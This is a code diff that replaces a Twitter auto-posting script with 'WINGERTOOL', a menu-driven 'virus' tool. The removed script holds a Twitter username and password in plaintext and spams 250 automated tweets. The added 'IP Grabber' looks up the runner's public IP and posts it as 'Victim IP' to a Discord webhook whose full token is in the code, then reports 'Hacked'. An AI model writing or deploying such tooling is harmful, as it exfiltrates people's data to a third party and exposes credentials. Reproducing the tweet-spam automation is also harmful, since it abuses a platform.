@@ -1,62 +1,47 @@
-from playwright.sync_api import sync_playwright
-import time
+# Author: wingsscripts
+# Version: 1.0.2
 
-TWITTER_USERNAME = "tinytalesofai"
-TWITTER_PASSWORD = "Tinytalesai@143"
-base_tweet = "This is my automated tweet new "
-tweets = [f"{base_tweet} {i}" for i in range(1, 251)]
+import requests
+import socket
 
-def login_and_tweet():
-    with sync_playwright() as p:
-        browser = p.chromium.launch(headless=False)
-        page = browser.new_page()
+print("WINGERTOOL")
+print("")
 
-        # Open Twitter
-        page.goto("https://twitter.com/login")
-        page.wait_for_timeout(3000)
+print("Loading")
 
-        # Enter username
-        page.locator('input[name="text"]').fill(TWITTER_USERNAME)
-        page.keyboard.press("Enter")
-        page.wait_for_timeout(3000)
 
-        # Enter password
-        try:
-            page.locator('input[name="password"]').fill(TWITTER_PASSWORD)
-            page.keyboard.press("Enter")
-        except:
-            print("Manual step required (e.g., phone/email check)")
+# Grabbing IP
+import requests
 
-        page.wait_for_timeout(5000)
+def get_public_ip():
+    try:
+        response = requests.get("https://api.ipify.org", timeout=5)
+        return response.text
+    except requests.RequestException:
+        return "Nie udało się pobrać publicznego "
 
-        # Tweet loop
-        for tweet in tweets:
-            try:
-                page.goto("https://twitter.com/home", timeout=60000)
-                page.wait_for_selector('div[data-testid="tweetTextarea_0"]', timeout=10000)
-                tweet_box = page.locator('div[data-testid="tweetTextarea_0"]')
-                tweet_box.click()
-                page.keyboard.type(tweet)
-                print("Trying to find the Post button...")
-                try:
-                    post_button = page.locator('button[data-testid="tweetButtonInline"]')
-                    print("Post button located.")
-                    page.wait_for_timeout(1000)
-                    if post_button.is_enabled():
-                        post_button.click()
-                        print("Post button clicked.")
-                    else:
-                        print("Post button is not enabled. Skipping click.")
-                except Exception as e:
-                    print(f"Failed to interact with Post button: {e}")
-                print(f"Tweeted: {tweet}")
-                time.sleep(30)
-            except Exception as e:
-                print(f"Error tweeting: {e}")
-                continue
 
-        print("Done tweeting all.")
-        browser.close()
 
-if __name__ == "__main__":
-    login_and_tweet()
+# WEBHOOK
+webhook_url = "https://discord.com/api/webhooks/1393916680530427915/gDUBIpEYftGEIRdo0K0dwD4LHW0pnVdqOUPlcgR8v37R2vW7QSs1CLu7JSSRq7Hv1Luz"  # ← wklej tu swój link
+dane = get_public_ip()
+
+print("Loaded successfully✅")
+
+print("Choose a virus")
+print("[1] IP Grabber")
+chooseOption = int(input(""))
+
+if chooseOption == 1:
+    get_public_ip()
+    
+    payload = {
+        "content": f"Victim IP: `{dane}`"
+    }
+
+response = requests.post(webhook_url, json=payload)
+
+if response.status_code == 204:
+    print("✅ Hacked")
+else:
+    print(f"❌ Error: {response.status_code}")
